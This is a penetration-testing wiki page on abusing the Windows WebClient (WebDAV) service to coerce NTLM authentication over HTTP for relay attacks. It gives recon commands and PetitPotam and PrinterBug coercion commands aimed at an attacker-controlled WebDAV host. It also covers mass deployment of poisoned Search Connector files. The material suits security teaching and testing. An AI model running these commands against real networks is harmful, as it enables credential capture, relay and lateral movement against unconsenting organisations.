---
authors: ShutdownRepo, mpgn, sckdev, Pri3st, rtpt-romankarwacik
---

# WebClient abuse (WebDAV)

## Theory

> Web Distributed Authoring and Versioning (WebDAV) is an extension to Hypertext Transfer Protocol (HTTP) that defines how basic file functions such as copy, move, delete, and create are performed by using HTTP ([docs.microsoft.com](https://docs.microsoft.com/en-us/windows/win32/webdav/webdav-portal))

The WebClient service needs to be enabled for WebDAV-based programs and features to work. As it turns out, the WebClient service can be indirectly abused by attackers to coerce authentications. This technique needs to be combined with other coercion techniques (e.g. [PetitPotam](ms-efsr.md), [PrinterBug](ms-rprn.md)) to act as a booster for these techniques. It allows attackers to elicit authentications made over HTTP instead of SMB, hence heightening [NTLM relay](../ntlm/relay.md) capabilities.

## Practice

### Recon

Attackers can remotely enumerate systems on which the WebClient is running, which is not uncommon in organizations that use OneDrive or SharePoint or when mounting drives with a WebDAV connection string.

> [!TIP]
> Even if the WebClient service is not currently running on a remote system, the coercion techniques in the abuse section will cause it to start if it is installed and in the state "Manual (Trigger Start)", default for Windows 10 and Windows 11. By default, the WebClient service is not installed on Windows Servers beginning with Windows Server 2008 per [WebDAVSystem](https://www.webdavsystem.com/server/access/windows). 

::: tabs

=== UNIX-like

From UNIX-like systems, this can be achieved with [webclientservicescanner](https://github.com/Hackndo/WebclientServiceScanner) (Python) or using [NetExec](https://github.com/Pennyw0rth/NetExec) (Python).

```bash
webclientservicescanner 'domain.local'/'user':'password'@'machine'
netexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav
```


=== Windows

From Windows systems, this can be achived with [GetWebDAVStatus](https://github.com/G0ldenGunSec/GetWebDAVStatus) (C, C#)

```bash
GetWebDAVStatus.exe 'machine'
```

:::


### Abuse

Regular coercion techniques rely on the attacker forcing a remote system to authenticate to another one. The "other" system is usually an IP address, a domain or NetBIOS name. With WebClient abuse, the other system needs to be supplied in a WebDAV Connection String format.

The WebDAV Connection String format is: `\\SERVER@PORT\PATH\TO\DIR`.

> [!TIP]
> To retrieve an authenticated connection, the remote server that attacker wants to victim to be relayed to [should be considered in the intranet zone](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#getting-intranet-zoned). One way to do it is to use the NetBIOS or DNS name of the attacker machine instead of its IP address.
> 
> In order to have a valid NetBIOS name, [Responder](https://github.com/lgandx/Responder) can be used.
> 
> A heftier alternative is to do some [ADIDNS poisoning](adidns-spoofing.md), [non-secure dynamic DNS updates, or Microsoft Dynamic DHCP 
 DNS abuse](https://alittleinsecure.com/dns-hijacking-say-my-name/) using [DDSpoof](https://github.com/akamai/DDSpoof) to create and use a valid DNS entry.

Below are a few examples of WebClient abuse with [PrinterBug](../print-spooler-service/printerbug.md) and [PetitPotam](ms-efsr.md).

```bash
# PrinterBug
dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/print" "VICTIM_IP"
SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS_NAME@PORT/print"

# PetitPotam
Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "VICTIM_IP"
Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "VICTIM_IP"
PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "VICTIM_IP"
```

In addition to remote system accounts, an attacker may also force authentication from a remote user account that opens a folder containing a SearchConnector using Windows Explorer from a Windows system where the WebClient service is installed.

[LinkSiren](https://github.com/gjhami/LinkSiren) (Python) crawls and ranks accessible share locations based on the number of recently accessed files. It can then be used to deploy and cleanup poisoned Search Connector files at scale that coerce both SMB and HTTP authentication.

```bash
# Identify optimal poisoning locations from a file containing UNC paths of hosts, shares, or subfolders to crawl
linksiren identify --targets '/path/to/base_targets.txt' 'DOMAIN'/'USERNAME':'PASSWORD'

# Mass deploy poisoned Search Connectors to a list of target UNC paths to folders
linksiren deploy --targets '/path/to/folder_targets.txt' --attacker 'ATTACKER_NETBIOS_NAME' 'DOMAIN'/'USERNAME':'PASSWORD'

# Capture and relay incoming authentication

# Mass cleanup all poisoned Search Connectors
linksiren cleanup --targets '/path/to/payloads_written.txt' 'DOMAIN'/'USERNAME':'PASSWORD'
```

### Start the WebClient service

On a side note, making a remote system start the WebClient service can be done in many ways

::: tabs

=== Map a WebDAV server

By mapping a remote WebDAV server. This can be done by having Responder's server up and by running the `net use` cmdlet.

```shell
# starting responder (in analyze mode to prevent poisoning)
responder --interface "eth0" --analyze
responder -I "eth0" -A

# map the drive from the target WebClient needs to be started on
net use x: http://$RESPONDER_IP/
```


=== searchConnector-ms

With a [searchConnector-ms](https://docs.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) file uploaded to widely used share within the organisation. Each time a user browses the folder, the WebClient service will start transparently.

```xml
xml version="1.0" encoding="UTF-8"?

Microsoft Outlook
false
true

{91475FE5-586B-4EBA-8D75-D17434B8CDF6}


https://whatever/


```


=== Explorer

By opening an interactive session with the target (e.g. RDP), opening the Explorer, and type something in the address bar.

=== Service trigger

According to [tiraniddo's research](https://www.tiraniddo.dev/2015/03/starting-webclient-service.html), the webclient service is registered with a service trigger, meaning it can be started automatically in response to a specific system event.
A simple way to start the service in an unprivileged session is by compiling and executing the following [C# PoC](https://gist.github.com/klezVirus/af004842a73779e1d03d47e041115797) created by [klezVirus](https://gist.github.com/klezVirus).

=== SharpStartWebclient

By compiling and executing the [SharpStartWebclient](https://github.com/eversinc33/SharpStartWebclient) tool created by [eversinc33](https://github.com/eversinc33)

=== Beacon Object File

By using the following [BOF (Beacon Object File)](https://github.com/outflanknl/C2-Tool-Collection/blob/main/BOF/StartWebClient/SOURCE/StartWebClient.c) created by [outflanknl](https://github.com/outflanknl).

:::


## Resources

[https://www.webdavsystem.com/server/access/windows](https://www.webdavsystem.com/server/access/windows)
[https://pentestlab.blog/2021/10/20/lateral-movement-webclient](https://pentestlab.blog/2021/10/20/lateral-movement-webclient)
[https://www.tiraniddo.dev/2015/03/starting-webclient-service.html](https://www.tiraniddo.dev/2015/03/starting-webclient-service.html)
